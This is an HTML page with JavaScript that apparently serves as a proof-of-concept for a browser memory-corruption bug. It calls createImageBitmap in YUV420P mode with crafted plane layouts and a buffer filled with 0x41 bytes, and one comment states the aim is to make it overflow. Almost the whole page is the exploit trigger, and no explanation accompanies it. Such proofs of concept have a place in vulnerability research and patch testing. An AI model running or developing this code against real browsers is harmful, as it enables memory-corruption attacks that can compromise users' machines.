<html>
<head>
</head>
<body>
    <script>
        try{
                //Represents the Cr.. elements
                //Not actually used all that much
                vLayout = {
                    offset: 0,
                    width: 4,
                    height: 1,
                    dataType: 'uint8',
                    stride: 1,
                    skip: 0,
                };

                var src_array = new Uint8Array(0x100000);
                for(var i = 0; i < src_array.length; i++){
                    src_array[i] = 0x41;
                }

                //represents our Y elemetns
                yLayout = {
                        offset: 0,
                        //mData.mYSize:
                        width: 1, //mData.mYSize.width
                        height: 1024, //mData.mYSize.height
                        dataType: 'uint8',
                        stride: 1, //mData.mYStride
                        skip: 1,
                    };

                //Represents the Cb.. elements
                uLayout = {
                        offset: 0,
                        //mData.mCbCrSize:
                        width: 2048, //mData.mCbCrSize.width
                        //width: target_array_size + 28, //mData.mCbCrSize.width
                        height: 1,  //mData.mCbCrSize.height
                        dataType: 'uint8',
                        stride: 1, //mData.mCbCrStride
                        skip: 1, //we actually want it to overflow such that we can skip 0.
                    };

                bitmap = createImageBitmap(src_array, 0, 1024, 'YUV420P', [yLayout, uLayout, vLayout]);

                console.log(bitmap);

                } catch (ex) {
                        console.log(ex);
                    }

    </script>
</body>
